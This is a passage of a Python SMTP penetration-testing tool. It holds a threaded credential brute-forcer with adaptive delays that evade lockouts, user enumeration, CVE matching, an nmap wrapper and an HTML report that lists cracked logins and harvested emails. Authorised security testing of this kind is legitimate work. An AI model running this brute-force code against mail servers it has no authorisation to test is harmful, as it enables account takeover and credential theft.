                        account_lockouts[user] = time.time()
                        logging.warning(f"User {user} might be locked out.")
            except smtplib.SMTPException as e:
                end_time = time.time()
                with shared_lock:
                    logging.error(f"SMTP error login {user}:{password}: {e}")
                    timing_data['fail'].append(end_time - start_time)
            except Exception as e:
                end_time = time.time()
                with shared_lock:
                    logging.error(f"Unexpected error during brute force {user}:{password}: {e}")
                    timing_data['fail'].append(end_time - start_time)
            finally:
                if server:
                    try: server.quit()
                    except: pass
                if ML_AVAILABLE and end_time:
                    anomaly_score = classify_response_anomaly(end_time - start_time, response_code_prefix)
                    adjust_attack_delay(anomaly_score)
                time.sleep(random.uniform(current_burst_delay, current_burst_delay * 2))
        except Exception as e:
            with shared_lock:
                logging.error(f"Connection error during brute force for {user}:{password}: {e}")
            if server:
                try: server.quit()
                except: pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for user in users:
            for password in passwords:
                futures.append(executor.submit(_attempt_login, user, password))
        
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            sys.stdout.write(f"\rBrute Force Progress: {i+1}/{len(futures)} attempts. Found {len(successful_logins)} valid credentials.")
            sys.stdout.flush()
        sys.stdout.write("\n")
    
    return successful_logins, timing_data


# ==================== MODERN PROTOCOL CHECKS ====================
if NETWORK_EXTRAS_AVAILABLE:
    def check_mta_sts(domain: str) -> Dict[str, Any]:
        """Checks for MTA-STS policy via DNS TXT and HTTPs fetch."""
        mta_sts_results = {'enabled': False, 'policy_fetched': False, 'valid_policy': False, 'notes': []}
        print(f"\n[*] Checking MTA-STS for {domain}...")
        try:
            txt_records = [r.to_text() for r in dns.resolver.resolve(f"_mta-sts.{domain}", "TXT")]
            mta_sts_txt_found = False
            for txt_str in txt_records:
                txt_str = txt_str.strip('"')
                if "v=STSv1" in txt_str and "id=" in txt_str:
                    mta_sts_txt_found = True
                    mta_sts_results['enabled'] = True
                    mta_sts_results['notes'].append(f"Found MTA-STS TXT record: {txt_str}")
                    break
            if not mta_sts_txt_found:
                mta_sts_results['notes'].append("No valid MTA-STS TXT record found.")
                return mta_sts_results
            
            policy_url = f"https://mta-sts.{domain}/.well-known/mta-sts.txt"
            session = requests.Session()
            if SOCKS_AVAILABLE and PROXY_SETTINGS['host'] and PROXY_SETTINGS['type'] == 'socks5':
                session.proxies = {'https': f'socks5h://{PROXY_SETTINGS["host"]}:{PROXY_SETTINGS["port"]}'}
            elif SOCKS_AVAILABLE and PROXY_SETTINGS['host'] and PROXY_SETTINGS['type'] == 'http':
                session.proxies = {'https': f'http://{PROXY_SETTINGS["host"]}:{PROXY_SETTINGS["port"]}'}
            try:
                response = session.get(policy_url, timeout=DEFAULT_TIMEOUT, verify=False)
                if response.status_code == 200:
                    mta_sts_results['policy_fetched'] = True
                    policy_content = response.text
                    mta_sts_results['notes'].append(f"MTA-STS Policy fetched from {policy_url}:\n---\n{policy_content.strip()}\n---")
                    if "version: STSv1" in policy_content and "mode:" in policy_content and "mx:" in policy_content:
                        mta_sts_results['valid_policy'] = True
                        mta_sts_results['notes'].append("MTA-STS policy content appears valid.")
                    else:
                        mta_sts_results['notes'].append("MTA-STS policy content seems invalid or incomplete.")
                else:
                    mta_sts_results['notes'].append(f"Failed to fetch MTA-STS policy from {policy_url}. Status: {response.status_code}")
            except requests.exceptions.RequestException as e:
                mta_sts_results['notes'].append(f"Error fetching MTA-STS policy: {e}")
        except dns.resolver.NXDOMAIN:
            mta_sts_results['notes'].append("MTA-STS TXT record (_mta-sts.domain) not found (NXDOMAIN).")
        except dns.resolver.NoAnswer:
            mta_sts_results['notes'].append("No MTA-STS TXT records found for the domain.")
        except Exception as e:
            mta_sts_results['notes'].append(f"An unexpected error occurred during MTA-STS check: {e}")
        return mta_sts_results
    
    def check_dane(domain: str, port: int = 25) -> Dict[str, Any]:
        """Checks for DANE TLSA records."""
        dane_results = {'enabled': False, 'tlsa_records': [], 'notes': []}
        print(f"\n[*] Checking DANE/TLSA for {domain} on port {port}...")
        try:
            query_name = f"_{port}._tcp.{domain}"
            try:
                socket.gethostbyname(domain)
            except socket.gaierror:
                dane_results['notes'].append(f"Cannot resolve domain {domain}. Skipping DANE check.")
                return dane_results
            
            tlsa_records = dns.resolver.resolve(query_name, "TLSA")
            if tlsa_records:
                dane_results['enabled'] = True
                for rdata in tlsa_records:
                    dane_results['tlsa_records'].append(str(rdata))
                    dane_results['notes'].append(f"Found DANE TLSA record: {rdata}")
                print(f"[+] DANE TLSA records found for {domain}:{port}.")
            else:
                dane_results['notes'].append(f"No DANE TLSA records found for {query_name}.")
                print(f"[-] No DANE TLSA records found for {domain}:{port}.")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            dane_results['notes'].append(f"No DANE TLSA records (NXDOMAIN/NoAnswer) for {query_name}.")
            print(f"[-] No DANE TLSA records found for {domain}:{port}.")
        except Exception as e:
            dane_results['notes'].append(f"Error checking DANE: {e}")
            print(f"[-] Error checking DANE for {domain}:{port}: {e}")
        return dane_results
    
    def identify_cloud_smtp_provider(target_ip_or_hostname: str) -> Optional[str]:
        """Identifies if the target SMTP server is hosted on a known cloud provider."""
        print(f"\n[*] Identifying cloud provider for {target_ip_or_hostname}...")
        try:
            ip_addresses = []
            if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", target_ip_or_hostname):
                ip_addresses.append(target_ip_or_hostname)
            else:
                addr_info = socket.getaddrinfo(target_ip_or_hostname, None)
                ip_addresses.extend([info[4][0] for info in addr_info if info[0] == socket.AF_INET])
            
            if not ip_addresses: return None
            
            for ip in ip_addresses:
                try:
                    hostname, _, _ = socket.gethostbyaddr(ip)
                    if "amazonaws.com" in hostname or "aws.eu" in hostname: return f"AWS SES ({hostname})"
                    if "azure.com" in hostname or "static.microsoft" in hostname: return f"Azure SMTP ({hostname})"
                    if "google.com" in hostname or "gcp.gserviceaccount" in hostname: return f"Google Cloud SMTP ({hostname})"
                    if "sendgrid.net" in hostname: return f"SendGrid ({hostname})"
                    if "mailgun.org" in hostname: return f"Mailgun ({hostname})"
                    if "outlook.com" in hostname or "protection.outlook.com" in hostname: return f"Microsoft 365 Exchange Online ({hostname})"
                    if "cloudflare.com" in hostname: return f"Cloudflare ({hostname})"
                    logging.debug(f"Reverse DNS for {ip}: {hostname}")
                except socket.herror:
                    logging.debug(f"No reverse DNS entry for {ip}.")
            return None
        except Exception as e:
            logging.error(f"Error identifying cloud SMTP provider for {target_ip_or_hostname}: {e}")
            return None


# ==================== CVE CHECKS (Updated with 2026 support) ====================
def _check_known_cves(banner: Optional[str], ehlo_extensions: List[str], open_relay_detected: bool, 
                      injection_findings: List[Dict[str, str]], vulns_2026: Dict[str, Any] = None) -> List[Dict[str, Any]]:
    """Checks the collected information against a database of known SMTP CVEs/weaknesses."""
    found_vulnerabilities = []
    
    def parse_version(version_string):
        return [int(v) for v in version_string.split('.')]
    
    def compare_versions(v1, operator, v2):
        parsed_v1 = parse_version(v1)
        parsed_v2 = parse_version(v2)
        for i in range(max(len(parsed_v1), len(parsed_v2))):
            val1 = parsed_v1[i] if i < len(parsed_v1) else 0
            val2 = parsed_v2[i] if i < len(parsed_v2) else 0
            if operator == '<': return val1 < val2
            if operator == '<=': return val1 <= val2
            if operator == '>': return val1 > val2
            if operator == '>=': return val1 >= val2
            if operator == '==': return val1 == val2
            if operator == '!=': return val1 != val2
            if val1 != val2: break
        return True if operator in ['==', '<=', '>='] and val1 == val2 else False
    
    for cve_id, cve_details in KNOWN_SMTP_CVES.items():
        is_vulnerable = False
        product_version_match = None
        if banner and cve_details.get("product_regex_pattern"):
            match = re.search(cve_details["product_regex_pattern"], banner, re.IGNORECASE)
            if match:
                product_version_match = match.group(match.lastindex) if match.lastindex else None
        
        if product_version_match and cve_details.get("vulnerable_versions_range"):
            for min_v, max_v in cve_details["vulnerable_versions_range"]:
                min_match = True
                max_match = True
                if min_v:
                    operator = min_v[0:2] if min_v.startswith(('<', '>', '=', '!')) else '>='
                    version_to_compare = min_v[2:] if min_v.startswith(('<', '>', '=', '!')) else min_v
                    min_match = compare_versions(product_version_match, operator, version_to_compare)
                if max_v:
                    operator = max_v[0:2] if max_v.startswith(('<', '>', '=', '!')) else '<='
                    version_to_compare = max_v[2:] if max_v.startswith(('<', '>', '=', '!')) else max_v
                    max_match = compare_versions(product_version_match, operator, version_to_compare)
                if min_match and max_match:
                    is_vulnerable = True
                    break
        
        if "VRFY" in cve_details.get("vulnerable_features", []) and ("VRFY" in ehlo_extensions or "250-VRFY" in ehlo_extensions):
            is_vulnerable = True
        if "EXPN" in cve_details.get("vulnerable_features", []) and ("EXPN" in ehlo_extensions or "250-EXPN" in ehlo_extensions):
            is_vulnerable = True
        if "OPEN_RELAY" in cve_details.get("vulnerable_features", []) and open_relay_detected:
            is_vulnerable = True
        if "COMMAND_INJECTION" in cve_details.get("vulnerable_features", []) and injection_findings:
            is_vulnerable = True
        if "SMTP_SMUGGLING" in cve_details.get("vulnerable_features", []) and injection_findings:
            is_vulnerable = True
        
        if is_vulnerable:
            vulnerability = {
                "cve_id": cve_id,
                "description": cve_details['description'],
                "recommendation": cve_details['recommendation'],
                "impact": cve_details['impact']
            }
            if 'cvss_score' in cve_details:
                vulnerability['cvss_score'] = cve_details['cvss_score']
            if 'cve_year' in cve_details:
                vulnerability['cve_year'] = cve_details['cve_year']
            found_vulnerabilities.append(vulnerability)
            logging.warning(f"CVE Match: {cve_id} - {cve_details['description']} (Version: {product_version_match} if applicable)")
    
    # Add 2026 vulnerability findings
    if vulns_2026:
        cve_map = {
            'smuggling_2': 'CVE-2025-21894',
            'exim_auth': 'CVE-2025-31158',
            'postfix_tls': 'CVE-2025-30233',
            'sendmail_traversal': 'CVE-2024-50042',
            'exchange_leak': 'CVE-2025-29785'
        }
        
        for check_name, check_result in vulns_2026.items():
            if isinstance(check_result, dict) and check_result.get('vulnerable', False):
                cve_id = cve_map.get(check_name)
                if cve_id and cve_id in KNOWN_SMTP_CVES:
                    cve_details = KNOWN_SMTP_CVES[cve_id]
                    vulnerability = {
                        "cve_id": cve_id,
                        "description": cve_details['description'] + f" (Check details: {', '.join(check_result.get('details', ['No details']))})",
                        "recommendation": cve_details['recommendation'],
                        "impact": cve_details['impact']
                    }
                    if 'cvss_score' in cve_details:
                        vulnerability['cvss_score'] = cve_details['cvss_score']
                    found_vulnerabilities.append(vulnerability)
    
    return found_vulnerabilities


# ==================== NMAP INTEGRATION ====================
def nmap_scan(target: str, port: int) -> Optional[str]:
    """Runs Nmap with more targeted SMTP scripts."""
    scripts = ["smtp-commands", "smtp-enum-users", "smtp-open-relay", "smtp-vuln-cve2010-0432", "smtp-ntlm-info", "smtp-starttls-detection"]
    cmd = ["nmap", "-p", str(port), "-sV", "--version-all", "--script", ",".join(scripts), target]
    print(f"\n[*] Running Nmap command: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=300)
        output = result.stdout
        print(f"\n[+] Nmap Scan Results for {target}:\n---\n{output}\n---")
        logging.info(f"Nmap Scan Results for {target}:\n{output}")
        return output
    except FileNotFoundError:
        print("[-] Nmap not found. Please install nmap to use this feature.")
        logging.error("Nmap not found.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"[-] Nmap command failed with error: {e.stderr}")
        logging.error(f"Nmap command failed: {e.stderr}")
        return None
    except subprocess.TimeoutExpired:
        print(f"[-] Nmap scan timed out after 5 minutes for {target}.")
        logging.warning(f"Nmap scan timed out for {target}.")
        return "Nmap scan timed out."
    except Exception as e:
        print(f"[-] Error running Nmap: {e}")
        logging.error(f"Error running Nmap: {e}")
        return None


# ==================== REPORTING AND VISUALIZATION ====================
if PLOTTING_AVAILABLE:
    def plot_timing_results(timing_data: Dict[str, List[float]], title: str, filename: str):
        """Plots response times for different categories using box plots."""
        if not timing_data or all(not data_list for data_list in timing_data.values()):
            print(f"[-] No timing data to plot for '{title}'. Skipping graph generation.")
            return
        
        valid_data_labels = [label for label, data_list in timing_data.items() if data_list]
        valid_data_values = [data_list for data_list in timing_data.values() if data_list]
        
        if not valid_data_labels:
            print(f"[-] No valid timing data to plot for '{title}'. Skipping graph generation.")
            return
        
        fig, ax = plt.subplots(figsize=(12, 7))
        bp = ax.boxplot(valid_data_values, labels=valid_data_labels, patch_artist=True, vert=True)
        colors = ['#4daf4a', '#e41a1c', '#377eb8', '#ff7f00', '#984ea3']
        for patch, color in zip(bp['boxes'], colors[:len(valid_data_labels)]):
            patch.set_facecolor(color)
        
        ax.set_title(title, fontsize=16)
        ax.set_ylabel("Response Time (seconds)", fontsize=12)
        ax.set_xlabel("Event Type", fontsize=12)
        ax.grid(True, linestyle='--', alpha=0.6)
        ax.tick_params(axis='x', rotation=15)
        
        for line in bp['medians']:
            x, y = line.get_xydata()[1]
            ax.text(x, y * 1.02, f'{y:.4f}', ha='center', va='bottom', fontsize=8, color='black')
        
        plt.tight_layout()
        try:
            plt.savefig(filename)
            print(f"[+] Saved timing graph to {filename}")
            logging.info(f"Saved timing graph to {filename}")
        except Exception as e:
            print(f"[-] Error saving plot {filename}: {e}")
            logging.error(f"Error saving plot {filename}: {e}")
        finally:
            plt.close(fig)
else:
    def plot_timing_results(*args, **kwargs):
        print("[!] matplotlib not installed. Skipping timing graph generation.")


def generate_report(results: Dict[str, Any], target_host: str) -> str:
    """Generates a comprehensive HTML report including all findings."""
    report_filename = f"smtp_pentest_report_{target_host.replace('.', '_')}_{int(time.time())}.html"
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SMTP Penetration Test Report - {results.get('target', 'N/A')}</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; margin: 20px; background-color: #f4f7f6; }}
            .container {{ max-width: 1200px; margin: auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }}
            h1, h2, h3 {{ color: #0056b3; border-bottom: 2px solid #e0e0e0; padding-bottom: 10px; margin-top: 30px; }}
            h1 {{ text-align: center; color: #004085; font-size: 2.5em; }}
            .section {{ margin-bottom: 25px; background: #fafafa; padding: 20px; border-radius: 5px; border: 1px solid #eee; }}
            .highlight-success {{ color: #28a745; font-weight: bold; }}
            .highlight-warning {{ color: #ffc107; font-weight: bold; }}
            .highlight-critical {{ color: #dc3545; font-weight: bold; }}
            .highlight-medium {{ color: #fd7e14; font-weight: bold; }}
            ul {{ list-style-type: none; padding: 0; }}
            ul li {{ background: #e9ecef; margin-bottom: 8px; padding: 10px 15px; border-radius: 4px; }}
            pre {{ background: #e9ecef; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; }}
            table {{ width: 100%; border-collapse: collapse; margin-top: 15px; }}
            th, td {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
            th {{ background-color: #0056b3; color: white; }}
            .image-container {{ text-align: center; margin-top: 20px; }}
            .image-container img {{ max-width: 90%; height: auto; border: 1px solid #ddd; border-radius: 5px; }}
            .footer {{ text-align: center; font-size: 0.9em; color: #777; margin-top: 40px; padding-top: 20px; border-top: 1px solid #eee; }}
            .badge {{ display: inline-block; padding: 3px 8px; border-radius: 4px; font-size: 0.8em; font-weight: bold; }}
            .badge-success {{ background: #28a745; color: white; }}
            .badge-warning {{ background: #ffc107; color: black; }}
            .badge-danger {{ background: #dc3545; color: white; }}
            .badge-critical {{ background: #6f42c1; color: white; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>SMTP Penetration Test Report (2026 Ultimate Edition)</h1>
            <p style="text-align: center; font-size: 1.1em;"><strong>Target:</strong> {results.get('target', 'N/A')}:{results.get('port', 'N/A')}</p>
            <p style="text-align: center;"><strong>Date:</strong> {time.ctime()}</p>
            
            <div class="section">
                <h2>I. Executive Summary</h2>
                <p>This report details the findings from an aggressive SMTP penetration test conducted on <code>{results.get('target', 'N/A')}</code>.</p>
                <p><strong>Overall Risk Level:</strong> <span class="{'highlight-critical' if results.get('open_relay') or results.get('successful_logins') else ('highlight-warning' if results.get('valid_users_vrfy') or results.get('valid_users_rcpt') or results.get('injection_fuzzing_logs') else 'highlight-success') }">
                { 'CRITICAL' if results.get('open_relay') or results.get('successful_logins') else ('HIGH' if results.get('valid_users_vrfy') or results.get('valid_users_rcpt') or results.get('injection_fuzzing_logs') else 'MEDIUM/LOW') }</span></p>
            </div>
    """
    
    # Add email harvesting results if available
    if results.get('harvested_emails'):
        html_content += f"""
            <div class="section">
                <h2>II. Email Harvesting Results</h2>
                <p>Total emails harvested: <strong>{len(results['harvested_emails'])}</strong></p>
                <details>
                    <summary>View harvested emails</summary>
                    <ul>
                        {''.join([f'<li>{email}</li>' for email in results['harvested_emails'][:50]])}
                        {f'<li>... and {len(results["harvested_emails"]) - 50} more</li>' if len(results['harvested_emails']) > 50 else ''}
                    </ul>
                </details>
            </div>
        """
    
    # Add certificate analysis results if available
    if results.get('certificate_analysis'):
        cert = results['certificate_analysis']
        html_content += f"""
            <div class="section">
                <h2>III. TLS Certificate Analysis</h2>
                <p><strong>Certificate Valid:</strong> <span class="{'highlight-success' if cert.get('valid') else 'highlight-critical'}">{cert.get('valid', False)}</span></p>
                <ul>
                    <li><strong>Common Name:</strong> {cert.get('info', {}).get('common_name', 'N/A')}</li>
                    <li><strong>Organization:</strong> {cert.get('info', {}).get('organization', 'N/A')}</li>
                    <li><strong>Issuer:</strong> {cert.get('info', {}).get('issuer', 'N/A')}</li>
                    <li><strong>Key Size:</strong> {cert.get('info', {}).get('key_size', 'N/A')} bits</li>
                    <li><strong>Signature Algorithm:</strong> {cert.get('info', {}).get('signature_algorithm', 'N/A')}</li>
                    <li><strong>Days Until Expiry:</strong> {cert.get('info', {}).get('days_until_expiry', 'N/A')}</li>
                    <li><strong>Subject Alternative Names:</strong> {', '.join(cert.get('info', {}).get('san', ['None']))}</li>
                </ul>
                {''.join([f'<p class="highlight-critical">⚠️ {warning}</p>' for warning in cert.get('warnings', [])])}
                {''.join([f'<p class="highlight-critical">❌ {error}</p>' for error in cert.get('errors', [])])}
            </div>
        """
    
    # Add email authentication results if available
    if results.get('email_auth'):
        auth = results['email_auth']
        html_content += f"""
            <div class="section">
                <h2>IV. Email Authentication (SPF/DKIM/DMARC)</h2>
                <h3>SPF</h3>
                <p><strong>Exists:</strong> <span class="{'highlight-success' if auth['spf']['exists'] else 'highlight-critical'}">{auth['spf']['exists']}</span></p>
                <p><strong>Details:</strong> <code>{' '.join(auth['spf']['details'][:3])}</code></p>
                {''.join([f'<p class="highlight-warning">⚠️ {issue}</p>' for issue in auth['spf']['issues']])}
                
                <h3>DKIM</h3>
                <p><strong>Exists:</strong> <span class="{'highlight-success' if auth['dkim']['exists'] else 'highlight-critical'}">{auth['dkim']['exists']}</span></p>
                <p><strong>Selectors Found:</strong> {', '.join(auth['dkim']['selectors']) or 'None'}</p>
                {''.join([f'<p class="highlight-warning">⚠️ {issue}</p>' for issue in auth['dkim']['issues']])}
                
                <h3>DMARC</h3>
                <p><strong>Exists:</strong> <span class="{'highlight-success' if auth['dmarc']['exists'] else 'highlight-critical'}">{auth['dmarc']['exists']}</span></p>
                <p><strong>Policy:</strong> <span class="{'badge badge-success' if auth['dmarc']['policy'] == 'reject' else 'badge badge-warning' if auth['dmarc']['policy'] == 'quarantine' else 'badge badge-danger'}">{auth['dmarc']['policy'] or 'Not configured'}</span></p>
                <p><strong>RUA (Report URI):</strong> {auth['dmarc'].get('rua', 'Not configured')}</p>
                {''.join([f'<p class="highlight-warning">⚠️ {issue}</p>' for issue in auth['dmarc']['issues']])}
                
                <h3>Overall Spoofing Risk</h3>
                <p><strong>Risk Level:</strong> <span class="{'badge badge-danger' if auth['spoofing_risk'] in ['CRITICAL', 'HIGH'] else 'badge badge-warning' if auth['spoofing_risk'] == 'MEDIUM' else 'badge badge-success'}">{auth['spoofing_risk']}</span></p>
                
                <h3>Recommendations</h3>
                <ul>
                    {''.join([f'<li>💡 {rec}</li>' for rec in auth['recommendations']]) or '<li>No recommendations</li>'}
                </ul>
            </div>
        """
        html_content += f"""
            <div class="section">
                <h2>V. Target Information & Capabilities</h2>
                <ul>
                    <li><strong>Banner:</strong> <code>{results.get('banner', 'N/A')}</code></li>
                    <li><strong>TLS Requested:</strong> {results.get('initial_tls_request', False)}</li>
                    <li><strong>STARTTLS Supported:</strong> <span class="{'highlight-success' if results.get('starttls_supported') else 'highlight-warning'}">{results.get('starttls_supported', 'N/A')}</span></li>
                    <li><strong>Supported ESMTP Extensions:</strong> <code>{', '.join(results.get('ehlo_extensions', [])) or 'None'}</code></li>
                    <li><strong>Identified Cloud/SaaS Provider:</strong> {results.get('cloud_provider', 'Not identified as cloud/SaaS')}</li>
                </ul>
            </div>
        """
    else:
        html_content += f"""
            <div class="section">
                <h2>III. Target Information & Capabilities</h2>
                <ul>
                    <li><strong>Banner:</strong> <code>{results.get('banner', 'N/A')}</code></li>
                    <li><strong>TLS Requested:</strong> {results.get('initial_tls_request', False)}</li>
                    <li><strong>STARTTLS Supported:</strong> <span class="{'highlight-success' if results.get('starttls_supported') else 'highlight-warning'}">{results.get('starttls_supported', 'N/A')}</span></li>
                    <li><strong>Supported ESMTP Extensions:</strong> <code>{', '.join(results.get('ehlo_extensions', [])) or 'None'}</code></li>
                    <li><strong>Identified Cloud/SaaS Provider:</strong> {results.get('cloud_provider', 'Not identified as cloud/SaaS')}</li>
                </ul>
            </div>
        """
    
    # Continue with rest of report...
    if results.get('nmap_output'):
        html_content += f"""
            <div class="section">
                <h2>VI. Nmap Scan Results</h2>
                <pre>{results['nmap_output']}</pre>
            </div>
        """
    
    html_content += f"""
            <div class="section">
                <h2>VII. User Enumeration Findings</h2>
                <h3>Valid Users (VRFY)</h3>
                <ul>{''.join([f'<li>{u}</li>' for u in results.get('valid_users_vrfy', [])]) or '<li>None detected.</li>'}</ul>
                <h3>Valid Users (RCPT TO)</h3>
                <ul>{''.join([f'<li>{u}</li>' for u in results.get('valid_users_rcpt', [])]) or '<li>None detected or confirmed.</li>'}</ul>
                <h3>EXPN Results</h3>
                {'<pre>' + '\\n'.join([f'{k}: {v}' for k,v in results.get('expn_results', {}).items()]) + '</pre>' if results.get('expn_results') else '<ul><li>No relevant EXPN responses.</li></ul>'}
            </div>
            
            <div class="section">
                <h2>VIII. Open Relay & Command Vulnerabilities</h2>
                <h3>Open Relay Detection</h3>
                <p><strong>Status:</strong> <span class="{'highlight-critical' if results.get('open_relay') else 'highlight-success'}">{ 'VULNERABLE (Open Relay Detected!)' if results.get('open_relay') else 'Not an Open Relay' }</span></p>
                <h3>SMTP Command Injection / Fuzzing Anomalies</h3>
                {'<ul>' + ''.join([f'<li><strong>Type:</strong> {f.get("type", "N/A")}<br><strong>Command:</strong> <code>{f.get("command", "N/A")}</code><br><strong>Payload:</strong> <code>{f.get("payload", "N/A")}</code><br><strong>Response:</strong> <pre>{f.get("response", "N/A")}</pre></li>' for f in results.get('injection_fuzzing_logs', [])]) + '</ul>' if results.get('injection_fuzzing_logs') else '<ul><li>No significant anomalies detected.</li></ul>'}
            </div>
            
            <div class="section">
                <h2>IX. Authentication Brute Force</h2>
                <h3>Successful Logins</h3>
                {'<ul>' + ''.join([f'<li><span class="highlight-critical">{u}:{p}</span></li>' for u,p in results.get('successful_logins', [])]) + '</ul>' if results.get('successful_logins') else '<ul><li>No successful logins.</li></ul>'}
                <p><strong>Note:</strong> Brute force attempts were conducted with <span class="highlight-warning">adaptive delays</span> and monitored for potential account lockouts.</p>
            </div>
    """
    
    # Add 2026 vulnerabilities section
    if results.get('vulns_2026'):
        vulns = results['vulns_2026']
        html_content += f"""
            <div class="section">
                <h2>X. 2026 Advanced Vulnerability Assessment</h2>
                <h3>Vulnerability Summary</h3>
                <ul>
        """
        
        cve_names = {
            'smuggling_2': 'CVE-2025-21894 - SMTP Smuggling 2.0',
            'exim_auth': 'CVE-2025-31158 - Exim AUTH RCE',
            'postfix_tls': 'CVE-2025-30233 - Postfix STARTTLS Downgrade',
            'sendmail_traversal': 'CVE-2024-50042 - Sendmail Queue Traversal',
            'exchange_leak': 'CVE-2025-29785 - Exchange Memory Leak'
        }
        
        for check_name, check_result in vulns.items():
            if isinstance(check_result, dict) and check_result.get('vulnerable', False):
                severity = check_result.get('severity', 'Low')
                severity_class = 'badge-danger' if severity in ['Critical', 'High'] else 'badge-warning'
                html_content += f"""
                    <li>
                        <strong>{cve_names.get(check_name, check_name)}</strong> - <span class="badge {severity_class}">{severity}</span>
                        <ul>
                            {''.join([f'<li>{detail}</li>' for detail in check_result.get('details', [])])}
                            {''.join([f'<li><code>{cmd}</code></li>' for cmd in check_result.get('exploit_commands', [])[:2]])}
                        </ul>
                    </li>
                """
        
        html_content += """
                </ul>
            </div>
        """
    
    if results.get('cve_findings'):
        html_content += f"""
            <div class="section">
                <h2>XI. CVE Specific Findings</h2>
                <table>
                    <thead>
                        <tr><th>CVE ID</th><th>Description</th><th>CVSS</th><th>Impact</th><th>Recommendation</th></tr>
                    </thead>
                    <tbody>
                        {''.join([f'<tr><td>{f.get("cve_id", "N/A")}</td><td>{f.get("description", "N/A")[:100]}...</td><td>{f.get("cvss_score", "N/A")}</td><td><span class="highlight-{f.get("impact", "N/A").lower()}">{f.get("impact", "N/A")}</span></td><td>{f.get("recommendation", "N/A")[:100]}...</td></tr>' for f in results.get('cve_findings', [])])}
                    </tbody>
                </table>
            </div>
        """
    
    if NETWORK_EXTRAS_AVAILABLE:
        html_content += f"""
            <div class="section">
                <h2>XII. Modern SMTP Protocol Checks</h2>
                <h3>MTA-STS Compliance</h3>
                <p><strong>Enabled:</strong> <span class="{'highlight-success' if results.get('mta_sts', {}).get('enabled') else 'highlight-warning'}">{results.get('mta_sts', {}).get('enabled', False)}</span></p>
                <p><strong>Policy Fetched:</strong> {results.get('mta_sts', {}).get('policy_fetched', False)}</p>
                <p><strong>Valid Policy:</strong> <span class="{'highlight-success' if results.get('mta_sts', {}).get('valid_policy') else 'highlight-warning'}">{results.get('mta_sts', {}).get('valid_policy', False)}</span></p>
                <p><strong>Notes:</strong></p>
                <ul>{''.join([f'<li>{note}</li>' for note in results.get('mta_sts', {}).get('notes', [])]) or '<li>No specific notes.</li>'}</ul>
                
                <h3>DANE (TLSA) Compliance</h3>
                <p><strong>Enabled:</strong> <span class="{'highlight-success' if results.get('dane', {}).get('enabled') else 'highlight-warning'}">{results.get('dane', {}).get('enabled', False)}</span></p>
                <p><strong>TLSA Records Found:</strong></p>
                <ul>{''.join([f'<li>{rec}</li>' for rec in results.get('dane', {}).get('tlsa_records', [])]) or '<li>None.</li>'}</ul>
                <p><strong>Notes:</strong></p>
                <ul>{''.join([f'<li>{note}</li>' for note in results.get('dane', {}).get('notes', [])]) or '<li>No specific notes.</li>'}</ul>
            </div>
        """
    
    html_content += f"""
            <div class="section">
                <h2>XIII. Timing Analysis Visualizations</h2>
                <p>Visual representation of response times captured during specific tests, highlighting potential anomalies.</p>
        """
    
    timing_graphs = [
        ("rcpt_timing.png", "RCPT TO Response Times"),
        ("bruteforce_timing.png", "Brute Force Response Times")
    ]
    for img_file, img_title in timing_graphs:
        if PLOTTING_AVAILABLE:
            try:
                import base64
                with open(img_file, "rb") as image_file:
                    encoded_string = base64.b64encode(image_file.read()).decode('utf-8')
                    html_content += f"""
                        <div class="image-container">
                            <h3>{img_title}</h3>
                            <img src="data:image/png;base64,{encoded_string}" alt="{img_title}">
                        </div>
                    """
            except FileNotFoundError:
                html_content += f"<p><em>{img_file} graph file ({img_file}) not found.</em></p>"
            except Exception as e:
                html_content += f"<p><em>Error embedding {img_file}: {e}</em></p>"
        else:
            html_content += f"<p><em>{img_file} graph requires matplotlib, which is not installed.</em></p>"
    
    html_content += f"""
            </div>
            <div class="section">
                <h2>XIV. Mitigation Recommendations (2026 Ultimate Edition)</h2>
                <ul>
                    <li><strong>Strict Access Control & Segmentation:</strong> Implement granular ACLs at firewalls. Isolate SMTP servers in a well-defined DMZ or hardened network segment.</li>
                    <li><strong>Mandatory TLS/SSL Enforcement:</strong> Enforce strong TLS encryption (TLS 1.2/1.3 only, no weaker ciphers) for _all_ connections. Implement MTA-STS and DANE for domain-level TLS enforcement and authenticity.</li>
                    <li><strong>Intelligent User Enumeration Prevention:</strong> Disable VRFY and EXPN. For RCPT TO, enforce strict rate limiting and differentiate between valid/invalid users by returning _identical_ error messages/response times for non-existent users (no timing side-channels).</li>
                    <li><strong>Robust Authentication & Brute Force Mitigation:</strong> Require strong, complex passwords and multi-factor authentication (MFA). Implement aggressive account lockout policies, IP blacklisting for repeated failures, and deploy credential stuffing prevention mechanisms.</li>
                    <li><strong>Zero Tolerance for Open Relays:</strong> Configure SMTP servers to _strictly_ deny relaying for unauthenticated or unauthorized users, particularly from internal to external and external to external domains.</li>
                    <li><strong>Advanced Input Validation & Smuggling Prevention:</strong> Implement stringent input validation for all SMTP commands and arguments to prevent injection, overflow, and smuggling attacks. Conduct regular code reviews and dynamic application security testing (DAST).</li>
                    <li><strong>Adaptive Rate Limiting & Throttling:</strong> Apply dynamic and statistical rate limiting based on observed behavior (e.g., using AI anomaly detection) across all relevant SMTP commands (HELO, MAIL FROM, RCPT TO, AUTH). Implement exponential backoff for suspicious traffic.</li>
                    <li><strong>Threat Intelligence & Anomaly Detection (AI-Driven):</strong> Deploy IDPS, WAFs, and SIEM solutions with AI/ML capabilities to continuously monitor SMTP traffic for anomalous behavior, known attack signatures, and brute-force patterns. Integrate with real-time threat intelligence feeds.</li>
